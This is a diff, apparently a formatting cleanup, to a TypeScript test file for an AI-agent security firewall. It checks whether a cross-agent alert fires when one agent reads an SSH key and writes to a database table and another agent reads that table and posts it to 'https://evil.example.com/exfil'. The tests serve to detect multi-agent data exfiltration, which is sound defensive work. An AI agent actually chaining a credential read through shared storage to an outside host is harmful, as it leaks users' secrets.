@@ -4,7 +4,7 @@
  * false correlations when different databases share table names.
  */
 
-import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { deriveCapabilityClass } from "@arikernel/core";
@@ -98,10 +98,18 @@ describe("CP-1 database resource key includes database name", () => {
 
 		// Agent A: read sensitive file → write to db1.users
 		await secureExecute(fwA, "file", "read", { path: sshKey });
-		await secureExecute(fwA, "database", "exec", { database: "db1", table: "users", query: "INSERT INTO users VALUES (1)" });
+		await secureExecute(fwA, "database", "exec", {
+			database: "db1",
+			table: "users",
+			query: "INSERT INTO users VALUES (1)",
+		});
 
 		// Agent B: read from db2.users (DIFFERENT database) → HTTP egress
-		await secureExecute(fwB, "database", "query", { database: "db2", table: "users", query: "SELECT * FROM users" });
+		await secureExecute(fwB, "database", "query", {
+			database: "db2",
+			table: "users",
+			query: "SELECT * FROM users",
+		});
 		await secureExecute(fwB, "http", "post", { url: "https://external.example.com/api" });
 
 		// No CP-1 alert should fire — the write (db1.users) and read (db2.users) are different resources
@@ -129,10 +137,18 @@ describe("CP-1 database resource key includes database name", () => {
 
 		// Agent A: read sensitive file → write to shared_db.messages
 		await secureExecute(fwA, "file", "read", { path: sshKey });
-		await secureExecute(fwA, "database", "exec", { database: "shared_db", table: "messages", query: "INSERT INTO messages VALUES (1)" });
+		await secureExecute(fwA, "database", "exec", {
+			database: "shared_db",
+			table: "messages",
+			query: "INSERT INTO messages VALUES (1)",
+		});
 
 		// Agent B: read from shared_db.messages (SAME resource) → HTTP egress
-		await secureExecute(fwB, "database", "query", { database: "shared_db", table: "messages", query: "SELECT * FROM messages" });
+		await secureExecute(fwB, "database", "query", {
+			database: "shared_db",
+			table: "messages",
+			query: "SELECT * FROM messages",
+		});
 		await secureExecute(fwB, "http", "post", { url: "https://evil.example.com/exfil" });
 
 		// CP-1 alert SHOULD fire — same database+table
@@ -162,10 +178,16 @@ describe("CP-1 database resource key includes database name", () => {
 
 		// Agent A: sensitive read → write to messages (no database specified)
 		await secureExecute(fwA, "file", "read", { path: sshKey });
-		await secureExecute(fwA, "database", "exec", { table: "messages", query: "INSERT INTO messages VALUES (1)" });
+		await secureExecute(fwA, "database", "exec", {
+			table: "messages",
+			query: "INSERT INTO messages VALUES (1)",
+		});
 
 		// Agent B: read from messages → HTTP egress
-		await secureExecute(fwB, "database", "query", { table: "messages", query: "SELECT * FROM messages" });
+		await secureExecute(fwB, "database", "query", {
+			table: "messages",
+			query: "SELECT * FROM messages",
+		});
 		await secureExecute(fwB, "http", "post", { url: "https://evil.example.com/exfil" });
 
 		// CP-1 alert should fire — same table, no database qualifier
